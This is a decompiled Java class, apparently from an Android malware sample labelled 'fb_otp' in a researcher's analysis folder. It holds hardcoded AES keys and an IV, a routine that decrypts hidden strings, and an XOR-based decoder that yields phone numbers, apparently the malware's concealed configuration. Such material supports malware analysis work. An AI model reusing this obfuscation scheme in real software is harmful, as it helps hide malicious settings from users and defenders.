import android.content.Context;
import com.soft360.iService.AService;
import java.security.NoSuchAlgorithmException;
import javax.crypto.Cipher;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public final class cD
{
  private String jdField_a_of_type_JavaLangString = "exs4Ts*D0T69O^MW";
  private Cipher jdField_a_of_type_JavaxCryptoCipher;
  private IvParameterSpec jdField_a_of_type_JavaxCryptoSpecIvParameterSpec = new IvParameterSpec(this.jdField_a_of_type_JavaLangString.getBytes());
  private SecretKeySpec jdField_a_of_type_JavaxCryptoSpecSecretKeySpec = new SecretKeySpec(this.b.getBytes(), "AES");
  private String b = "o&2V&TZ3g*6U9hIq";
  
  public cD()
  {
    try
    {
      this.jdField_a_of_type_JavaxCryptoCipher = Cipher.getInstance("AES/CBC/NoPadding");
      return;
    }
    catch (NoSuchAlgorithmException localNoSuchAlgorithmException)
    {
      localNoSuchAlgorithmException.printStackTrace();
      return;
    }
    catch (NoSuchPaddingException localNoSuchPaddingException)
    {
      localNoSuchPaddingException.printStackTrace();
    }
  }
  
  public static String a(String paramString)
  {
    paramString = b(paramString);
    long l = Long.parseLong(AService.a.getString(2131165198));
    Object localObject = new StringBuffer("");
    int i = 0;
    for (;;)
    {
      if (i >= paramString.length())
      {
        localObject = ((StringBuffer)localObject).toString();
        paramString = (String)localObject;
        if (((String)localObject).startsWith("011")) {
          paramString = "+" + ((String)localObject).substring(3);
        }
        return paramString;
      }
      int j = (short)paramString.charAt(i);
      ((StringBuffer)localObject).append((char)(int)(j ^ l >> 8));
      l = ((l + j) * 52845L + 22719L) % 65536L;
      i += 1;
    }
  }
  
  public static String b(String paramString)
  {
    StringBuilder localStringBuilder = new StringBuilder();
    paramString = paramString.toCharArray();
    int i = 0;
    for (;;)
    {
      if (i >= paramString.length - 1) {
        return localStringBuilder.toString();
      }
      localStringBuilder.append((char)(Character.digit(paramString[i], 16) * 16 + Character.digit(paramString[(i + 1)], 16)));
      i += 2;
    }
  }
  
  public final byte[] a(String paramString)
  {
    Object localObject = null;
    if ((paramString == null) || (paramString.length() == 0)) {
      return "0".getBytes();
    }
    for (;;)
    {
      int i;
      try
      {
        this.jdField_a_of_type_JavaxCryptoCipher.init(2, this.jdField_a_of_type_JavaxCryptoSpecSecretKeySpec, this.jdField_a_of_type_JavaxCryptoSpecIvParameterSpec);
        Cipher localCipher = this.jdField_a_of_type_JavaxCryptoCipher;
        if (paramString == null)
        {
          paramString = localCipher.doFinal((byte[])localObject);
          if (paramString.length <= 0) {
            break;
          }
          i = paramString.length - 1;
          j = 0;
          if (i < 0)
          {
            if (j <= 0) {
              break;
            }
            localObject = new byte[paramString.length - j];
            System.arraycopy(paramString, 0, localObject, 0, paramString.length - j);
            return (byte[])localObject;
          }
        }
        else
        {
          if (paramString.length() < 2) {
            continue;
          }
          j = paramString.length() / 2;
          byte[] arrayOfByte = new byte[j];
          i = 0;
          localObject = arrayOfByte;
          if (i >= j) {
            continue;
          }
          arrayOfByte[i] = ((byte)Integer.parseInt(paramString.substring(i * 2, i * 2 + 2), 16));
          i += 1;
          continue;
        }
        k = j;
      }
      catch (Exception paramString)
      {
        throw new Exception("[decrypt] " + paramString.getMessage());
      }
      int k;
      if (paramString[i] == 0) {
        k = j + 1;
      }
      i -= 1;
      int j = k;
    }
    return paramString;
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/cD.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */